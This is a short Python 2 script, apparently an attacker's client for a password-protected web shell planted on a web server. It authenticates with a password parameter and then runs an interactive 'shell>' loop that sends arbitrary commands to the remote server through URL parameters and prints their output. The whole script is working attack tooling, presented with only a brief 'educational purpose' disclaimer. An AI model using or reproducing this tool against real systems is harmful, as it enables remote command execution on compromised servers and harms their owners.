#!/usr/bin/python 
#coded by : Lawrence Amer 
# coder is not responsiable for any harmful use of this tool . made just for educational purpose 
import os 
import urllib2
import sys

#console colors 
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
banner=(O+""" 
     ,AM   ,pP""Yq.       ,AM   
    AVMM  6W'    `Wb     AVMM   
  ,W' MM  8M      M8   ,W' MM   
,W'   MM  YA.    ,A9 ,W'   MM   
AmmmmmMMmm `Ybmmd9'  AmmmmmMMmm 
      MM                   MM   
      MM                   MM 
     [+] this tool has been made to help security Researcher to do Trusted and authorized Testing!
     [+] Coder Name : Lawrence Amer 
""")
if len(sys.argv) < 2:
  print "use <url> <password> "% sys.argv[0]
  sys.exit(1)
print banner
url = sys.argv[1]
password = sys.argv[2]
data = "?password=%s"% password
command = data+"&command"
checker= False 
try: 
 print G+"[~]Establishing a connection .."
 rec = urllib2.Request(url+data) 
 response = urllib2.urlopen(rec)
 check = response.read()
 i = len(check)
 f = check.find("$.")
 #print f
 #print i #activate it when you want to customize file length size
   
 if (f==0): # 
   print(P+"""
----------------------------------------
         HOWDY!
         404  SECURE SHELL .. v1.0 
         YOU ARE Connected ! ... 
----------------------------------------
         """)
   
   checker= True
   while checker:
     cmd=raw_input(R+"shell> ")
     newcmd=cmd.replace(" ","%20")   
     rec2 = urllib2.Request(url+command+"=%s"%(newcmd)) 
     #urlencode=urllib2.unquote(rec2)
     response = urllib2.urlopen(rec2)
     check2 = response.read()
     print(G+"-->"+check2)
 else:
    print R+" [!].sorry..password is not correct .."
    
except: 
 print "[~] Connection LOST !"   
